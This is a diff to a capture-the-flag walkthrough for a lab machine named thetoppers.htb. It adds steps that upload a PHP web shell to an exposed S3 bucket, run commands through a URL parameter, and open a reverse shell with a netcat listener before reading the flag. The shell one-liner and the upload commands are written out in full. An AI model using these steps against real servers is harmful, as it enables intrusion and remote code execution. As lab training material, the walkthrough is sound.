@@ -527,13 +527,32 @@ Going in blind.
 23. We can also use the ls command to list objects and common prefixes under the specified bucket.
 24. awscli command --> `~$aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`
   - Discovered:
+                                 PRE images/
     - 2025-05-06 16:50:58          0 .htaccess
     - 2025-05-06 16:50:58      11952 index.php
 
-25. 
-
-
-
+25. `awscli` has got another feature that allows us to copy files to a remote bucket. We already know that the
+website is using PHP. Thus, we can try uploading a PHP shell file to the `S3` bucket and since it's uploaded to
+the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we
+will achieve remote code execution.
+26. We can use the following PHP one-liner which uses the `system()` function which takes the URL parameter `cmd` as an input and executes it as a system command.
+27. `<?php system($_GET["cmd"]); ?>`
+28. Let's create a PHP file to upload.
+29. `$ echo '<?php system($_GET["cmd"]); ?>' > shell.php`
+30. Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command.
+31. `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`
+32. We can confirm that our shell is uploaded by navigating to _http://thetoppers.htb/shell.php_.
+33. Let us try executing the OS command `id` using the URL parameter `cmd`. --> `?cmd=id`
+34. If successful, time to get a reverse shell.
+35. I will just copy the same steps the get command injection in the s3 bucket but for a reverse shell
+36. Using `revshells.com` I copied the `"PHP Pentest Monkey"` reverse shell payload to a file called `revshell.php`
+37. I uploaded the file to the s3 bucket the same way as in step 31. --> `aws --endpoint=http://s3.thetoppers.htb s3 cp revshell.php s3://thetoppers.htb`
+38. Next I setup a netcat listener on port 4242 (any unused and uncommon port) --> `nc -lnvp 4242`
+39. Then I simply navigated to the revshell.php file I uploaded located `http://thetoppers.htb/revshell.php`
+40. Lo and behold, we get a reverse shell. Time to find the flag.
+41. Flag located at `/var/www/flag.txt`
+42. Flag captured
+43. Machine Pwned
 
 * * *
 
